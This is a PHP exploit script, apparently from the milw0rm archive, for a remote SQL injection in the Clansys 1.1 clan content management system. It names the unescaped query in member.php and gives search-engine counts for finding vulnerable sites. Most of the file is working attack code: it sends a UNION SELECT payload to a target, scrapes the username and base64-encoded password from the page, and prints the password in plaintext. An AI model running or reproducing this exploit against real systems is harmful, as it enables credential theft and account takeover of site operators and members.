<?php /*

 |---==============================================================---|
 |                          /\�\__       /\�\                         |   
 |     ____    ___      __  \ \  _\   ___\ \ \___      __    ___      |    
 |    /  __\ /  _  \  / __ \ \ \ \/  / ___\ \  _  \  / __ \/\  __\    |    
 |   /\__,  \/\ \/\ \/\ \_\ \_\ \ \_/\ \__/\ \ \ \ \/\  __/\ \ \/     |     
 |   \/\____/\ \_\ \_\ \__/ \_\\ \__\ \____\\ \_\ \_\ \____\\ \_\     |      
 |    \/___/  \/_/\/_/\/__/\/_/ \/__/\/____/ \/_/\/_/\/____/ \/_/     |     
 |                                     >> Internet Security           |                         
 |---==============================================================---|
 
        title: clansys 1.1 remote sql injection
      release: 2006-04-10
       author: snatcher [snatcher at gmx.ch]
      country: switzerland  |+|
	  
  application: clansys 1.1
  description: a php / mysql based clan content management system
     download: http://www.clanscripte.net/main.php?content=download&do=file&dlid=113
  description: you can get each password with a simple sql injection. the password 
               is base64 encoded, but it's easy to decode, that means, you will get
			   the password in plaintext :)
  fingerprint: google -> "Clansys  v.1.1" -> 4'030
               msn -> "Clansys  v.1.1" ->  529
   conditions: 
       greets: honkey, str0ke <- good exploit publisher :),
			   all security guys and coders over the world,
 terms of use: this exploit is just for educational purposes, do not use it for illegal acts.


---------------------------- member.php - line 180 -------------------------------------
$sql = "SELECT * FROM member WHERE id=$showid";
-----------------------------------------------------------------------------------------

because this $showid isn't escaped correctly you can insert malicious sql code,
i.e. with a union operator.


*/

/*********************** CONFIGURATION ****************************/

$PATH_TO_FILE  = 'http://yourhost.com/index.php';                  // in example: http://yourhost.com/index.php
$USER_ID       = 1;                                                // which user? default: 1
$TABLE_PREFIX  = '';                                               // default: empty
$GET_VARS      = '?page=member&func=detail&showid=';               // do not change
$SQL_INJECTION = '-666 union select 0,nick,realname,nick,pass,'.   // do not change
                 'pass,pass,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,'.
				 '0,0,0 from '.$TABLE_PREFIX.'member where id = '.
				 $USER_ID.' limit 1 /*';


/**************************** MAIN ********************************/

$file_array = file($PATH_TO_FILE.$GET_VARS.urlencode($SQL_INJECTION))or die('couldn\'t open host!'); 
foreach ($file_array as $now)                               
	$html_content .= $now;

$html_content = str_castrate($html_content);

preg_match_all("!<tdwidth=224height=20valign=middlealign=center><p><br><br><b>(.*?)Details</p></td>!",
			   $html_content,$username); /* gets username */
preg_match_all("!wwp.icq.com\/scripts\/online.dll\?icq=(.*?)=\&img=5border=0align=top>!", 
                $html_content,$password); /* gets password */

if ($username[1][0] && $password[1][0]) {
	echo 'username: <b>'.$username[1][0].'</b> (user_id: '.$USER_ID.')<br>';
	echo 'password: <b>'.base64_decode($password[1][0]).'</b>';
}else {
	echo 'exploit failed! <br>';
}
echo '<br><br><br><br><br>
======================================================================<br>
exploit: clansys 1.1 remote sql injection vulnerability<br>
release: 2006-04-10<br>
author: snatcher [snatcher at gmx.ch]<br>
======================================================================';

function str_castrate($string) {
	$string = str_replace("\n", '', $string);
	$string = str_replace("\r", '', $string);
	$string = str_replace(" ", '', $string);
	return $string;
}
?>

# milw0rm.com [2006-04-10]
